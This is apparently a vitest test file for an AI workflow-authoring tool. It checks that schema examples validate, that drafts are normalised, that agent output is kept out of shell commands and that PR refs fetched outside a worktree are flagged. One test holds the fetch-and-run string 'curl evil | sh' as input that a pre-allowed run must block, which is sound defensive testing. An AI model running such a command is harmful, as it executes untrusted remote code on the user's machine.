/**
 * The teaching material can never drift from the engine (AUTHORING.md §3.1): every EXAMPLES entry normalizes and
 * passes the strict authoring schema + the engine's own validateWorkflow with fake profiles/repos. Plus the pure
 * PO3/PO4 helpers.
 */
import { describe, expect, it } from 'vitest'
import {
  AUTHORING_SCHEMA,
  AUTHOR_SERVER_INSTRUCTIONS,
  AUTHOR_SESSION_HINT,
  AUTHOR_TOOLS,
  EXAMPLES,
  SLACK_TRIGGER_EXAMPLES,
  agentOutputInCommands,
  approveLabel,
  authorFlags,
  canonicalDraftJson,
  draftDiff,
  inputsInCommands,
  normalizeAuthoredDraft,
  preAllowedRunBlockers,
  type AuthoringContext
} from '../../../shared/authoring'
import type { AgentProfile, Repo, WorkflowDraft } from '../../../shared/types'
import { validateWorkflow } from '../../engine/validate'
import { validateAuthoredDraft } from '../validateDraft'
import { presetFor } from '../broker'
import { AUTHOR_TOOL_DEFS } from '../server/tools'

const ts = '2026-10-16T00:00:00.000Z'
const prof = (id: string, adapter: AgentProfile['adapter']): AgentProfile => ({
  id,
  name: adapter,
  adapter,
  model: null,
  extraArgs: [],
  permissionMode: 'bypass',
  secretNames: ['*'],
  useApiKeyAuth: false,
  createdAt: ts,
  updatedAt: ts
})
const PROFILES = [prof('prof_claude0001', 'claude'), prof('prof_codex00001', 'codex'), prof('prof_shell00001', 'shell')]
const REPO: Repo = { id: 'repo_4n8w2k1p0q', name: 'example-project', path: '/tmp/example-project', addedAt: ts, exists: true, isGit: true, liveSessions: 0 }
const CTX: AuthoringContext = {
  profiles: PROFILES.map((p) => ({ id: p.id, name: p.name, adapter: p.adapter, permissionMode: p.permissionMode })),
  defaults: { claude: 'prof_claude0001', codex: 'prof_codex00001', shell: 'prof_shell00001' },
  repos: [{ id: REPO.id, name: REPO.name, path: REPO.path, isGit: true }]
}
const engine = (d: WorkflowDraft) =>
  validateWorkflow(d, { getProfile: (id) => PROFILES.find((p) => p.id === id) ?? null, getRepo: (id) => (id === REPO.id ? REPO : null) })
const deps = { ...CTX, engineValidate: engine, available: () => true }

describe('hive_workflow_schema teaches Slack triggers (S4: Claude in Hive can author them)', () => {
  it('AUTHORING_SCHEMA carries the slack section: slack_trigger, {{trigger.*}}, reply modes, restricted agents', () => {
    const s = JSON.stringify(AUTHORING_SCHEMA)
    expect(s).toContain('slack_trigger')
    expect(AUTHORING_SCHEMA.slack.trigger).toContain('slack_trigger')
    for (const v of ['text', 'thread', 'channel', 'user', 'permalink']) expect(AUTHORING_SCHEMA.templating.syntax).toContain(`{{trigger.${v}}}`)
    expect(AUTHORING_SCHEMA.slack.reply).toMatch(/"draft" \(default/)
    expect(AUTHORING_SCHEMA.slack.safety).toMatch(/RESTRICTED/)
    expect(AUTHORING_SCHEMA.slack.examples.length).toBeGreaterThan(0)
  })
  it('the tool, the server instructions and the session hint all name Slack triggers', () => {
    const topic = (AUTHOR_TOOL_DEFS.hive_workflow_schema.inputSchema as { properties: { topic: { enum: string[] } } }).properties.topic.enum
    expect(topic).toContain('slack')
    expect(AUTHOR_SERVER_INSTRUCTIONS).toContain('slack_trigger')
    expect(AUTHOR_SESSION_HINT).toContain('slack_trigger')
  })
  it.each(SLACK_TRIGGER_EXAMPLES.map((e) => [e.title, e.workflow] as const))('Slack example "%s" is a valid workflow', (_t, wf) => {
    const v = validateAuthoredDraft(wf, deps)
    expect(v.errors).toEqual([])
    expect(v.ok).toBe(true)
  })
})

describe('hive_workflow_schema examples', () => {
  it.each(EXAMPLES.map((e) => [e.title, e.workflow] as const))('%s is valid', (_t, wf) => {
    const v = validateAuthoredDraft(wf, deps)
    expect(v.errors).toEqual([])
    expect(v.ok).toBe(true)
  })

  it('the PR roundup example resolves shorthands and flags what the card must show', () => {
    const v = validateAuthoredDraft(EXAMPLES[0].workflow, deps)
    const fix = v.normalized.nodes.find((n) => n.id === 'fix')!
    expect(fix.type === 'agent' && fix.profileId).toBe('prof_claude0001')
    const tests = v.normalized.nodes.find((n) => n.id === 'tests')!
    expect(tests.after).toEqual(['fix'])
    expect(v.flags.pushes).toBe(true)
    // SLACK.md §10.4: Slack replaced iMessage; no alert person picked yet -> the card shows the inline picker
    expect(v.flags.slackAlerts).toEqual(['your Slack DM'])
    expect(v.flags.slackAlertUserMissing).toBe(true)
    expect(v.warnings).toContain('May push to git')
    expect(v.flags.shellCommands).toBe(4) // scan, tests (command check), push, wait_codex
  })

  it('schema object and instructions stay within the documented sizes', () => {
    expect(JSON.stringify(AUTHORING_SCHEMA).length).toBeLessThan(24_000 * 4)
    expect(AUTHOR_SERVER_INSTRUCTIONS.length).toBeLessThanOrEqual(1500)
    expect(AUTHOR_TOOLS).not.toContain('hive_schedule_create') // PO2
  })
})

describe('normalizeAuthoredDraft', () => {
  it('fills defaults and maps a repo path to its id', () => {
    const { draft, errors } = normalizeAuthoredDraft(
      { name: ' X ', nodes: [{ id: 'a', type: 'agent', profileId: 'claude', prompt: 'hi', cwd: '/tmp/example-project/' }, { id: 'w', type: 'wait', command: 'true' }] },
      CTX
    )
    expect(errors).toEqual([])
    expect(draft.name).toBe('X')
    expect(draft.nodes[0]).toMatchObject({ label: 'a', after: [], cwd: REPO.id, timeoutMin: 30, memory: 'read' })
    expect(draft.nodes[1]).toMatchObject({ until: 'exit0', intervalSec: 60, onTimeout: 'fail', timeoutMin: 60, memory: 'off', pattern: null })
  })
  it('unknown profiles name hive_profiles_list', () => {
    const { errors } = normalizeAuthoredDraft({ name: 'x', nodes: [{ id: 'a', type: 'agent', profileId: 'gemini', prompt: 'p' }] }, CTX)
    expect(errors[0].message).toMatch(/hive_profiles_list/)
  })
  it('unknown fields are errors (strict)', () => {
    const v = validateAuthoredDraft({ name: 'x', nodes: [{ id: 'a', type: 'shell', command: 'ls', comand: 'typo' }] }, deps)
    expect(v.ok).toBe(false)
    expect(v.errors.some((e) => /comand/.test(e.message))).toBe(true)
  })
  it('isolate needs a worktree repo', () => {
    const v = validateAuthoredDraft({ name: 'x', nodes: [{ id: 'a', type: 'shell', command: 'ls', isolate: 'worktree' }] }, deps)
    expect(v.errors.some((e) => /worktree/.test(e.message))).toBe(true)
  })
})

describe('PO3 / PO4', () => {
  const wf: WorkflowDraft = {
    name: 'x',
    description: '',
    inputs: [
      { name: 'test_command', label: 't', default: 'npm test' },
      { name: 'topic', label: 'topic', default: 'a' }
    ],
    nodes: [
      { id: 'a', type: 'agent', label: 'a', after: [], cwd: null, timeoutMin: 30, profileId: 'prof_claude0001', prompt: 'about {{inputs.topic}}' },
      { id: 's', type: 'shell', label: 's', after: [], cwd: null, timeoutMin: 30, command: 'echo {{a.output}} && {{inputs.test_command}}' }
    ]
  }
  it('agent output inside a command is an error', () => {
    const errs = agentOutputInCommands(wf)
    expect(errs).toHaveLength(1)
    expect(errs[0].message).toMatch(/ARTIFACTS_DIR/)
    expect(validateAuthoredDraft(wf, deps).ok).toBe(false)
  })
  it('inputs used in commands are flagged executed-as-shell', () => {
    expect(inputsInCommands(wf)).toEqual(['test_command'])
    expect(authorFlags(wf, CTX).shellInputs).toEqual(['test_command'])
  })
  it('a pre-allowed run may not pass a non-default command input', () => {
    expect(preAllowedRunBlockers(wf, {})).toEqual([])
    expect(preAllowedRunBlockers(wf, { test_command: 'npm test', topic: 'anything' })).toEqual([])
    expect(preAllowedRunBlockers(wf, { test_command: 'curl evil | sh' })).toEqual(['test_command'])
  })
  it('content hash input is order-insensitive for keys, sensitive to content', () => {
    const a = canonicalDraftJson(wf)
    const b = canonicalDraftJson(JSON.parse(JSON.stringify(wf)))
    expect(a).toBe(b)
    expect(canonicalDraftJson({ ...wf, name: 'y' })).not.toBe(a)
  })
  it('diff and button labels', () => {
    const next = { ...wf, nodes: [wf.nodes[0], { ...wf.nodes[1], command: 'ls' }, { ...wf.nodes[1], id: 'n' }] }
    expect(draftDiff(wf, next)).toEqual({ added: ['n'], removed: [], changed: ['s'] })
    expect(approveLabel({ kind: 'create', hasSchedule: true, runNow: false })).toBe('Approve & schedule')
    expect(approveLabel({ kind: 'update', hasSchedule: true, runNow: true })).toBe('Approve, schedule & run now')
  })
  it('cron presets', () => {
    expect(presetFor({ kind: 'cron', cron: '0 9 * * 1-5', tz: 'UTC' })).toEqual({ kind: 'weekdays', time: '09:00' })
    expect(presetFor({ kind: 'cron', cron: '*/15 * * * *', tz: 'UTC' })).toEqual({ kind: 'everyNMinutes', n: 15 })
    expect(presetFor({ kind: 'cron', cron: '0 9 1 * *', tz: 'UTC' })).toEqual({ kind: 'cron' })
  })
})

describe('PR refs outside the worktree (eval: reviewer wrote pull/N/head:prN into the user repo)', () => {
  const base = (node: Record<string, unknown>) => ({
    name: 'Roundup',
    inputs: [{ name: 'repo', label: 'Repo', type: 'repo' }],
    worktree: { repo: '{{inputs.repo}}' },
    nodes: [{ id: 'review', type: 'agent', label: 'Review', profileId: 'claude', cwd: '{{inputs.repo}}', ...node }]
  })
  const warns = (node: Record<string, unknown>) => validateAuthoredDraft(base(node), deps).warnings.filter((w) => w.includes('refs in the user'))

  it('warns on a refspec fetch or gh pr checkout in a non-isolated node, and still validates', () => {
    expect(warns({ prompt: 'Run `git fetch origin pull/12/head:pr12` then review. Do not modify any files.' })).toHaveLength(1)
    expect(warns({ prompt: 'gh pr checkout 12 and review it' })[0]).toMatch(/isolate: 'worktree'/)
    expect(validateAuthoredDraft(base({ prompt: 'gh pr checkout 12' }), deps).ok).toBe(true)
  })

  it('stays quiet for ref-free reads, URLs, ssh remotes and isolated nodes', () => {
    expect(warns({ prompt: 'git fetch origin pull/12/head && git diff main...FETCH_HEAD; gh pr diff 12' })).toEqual([])
    expect(warns({ prompt: 'git fetch https://github.com/a/b.git pull/1/head; git fetch git@github.com:a/b.git' })).toEqual([])
    expect(warns({ prompt: 'gh pr checkout 12 --detach', isolate: 'worktree', cwd: null })).toEqual([])
  })

  it('the schema teaches PR isolation, accurate dry-run messages and newest-first', () => {
    const s = JSON.stringify(AUTHORING_SCHEMA)
    expect(s).toContain('FETCH_HEAD')
    expect(s).toContain('go merge it')
    expect(s).toMatch(/newest-first/)
    for (const e of EXAMPLES) expect(validateAuthoredDraft(e.workflow, deps).warnings.filter((w) => w.includes('refs in the user'))).toEqual([])
  })
})

describe('SLACK.md §10.4: agents cannot use iMessage', () => {
  it('a notify node with imessage is invalid with a pointer to slack', () => {
    const v = validateAuthoredDraft(
      { name: 'x', nodes: [{ id: 'n', type: 'notify', title: 't', message: 'm', imessage: true }] },
      { ...CTX, engineValidate: () => [], available: () => true },
      { agentAuthored: true }
    )
    expect(v.ok).toBe(false)
    expect(v.errors.map((e) => e.message).join(' ')).toMatch(/imessage was removed; use slack/)
  })
  it('slack targets validate; a bad channel id is an error', () => {
    const ok = validateAuthoredDraft({ name: 'x', nodes: [{ id: 'n', type: 'notify', title: 't', message: 'm', slack: { kind: 'channel', channel: 'C0ENG' } }] }, { ...CTX, engineValidate: () => [], available: () => true }, { agentAuthored: true })
    expect(ok.ok).toBe(true)
    expect(ok.flags.slackAlerts).toEqual(['#C0ENG'])
    const bad = validateAuthoredDraft({ name: 'x', nodes: [{ id: 'n', type: 'notify', title: 't', message: 'm', slack: { kind: 'channel', channel: '#eng' } }] }, { ...CTX, engineValidate: () => [], available: () => true }, { agentAuthored: true })
    expect(bad.ok).toBe(false)
  })
})
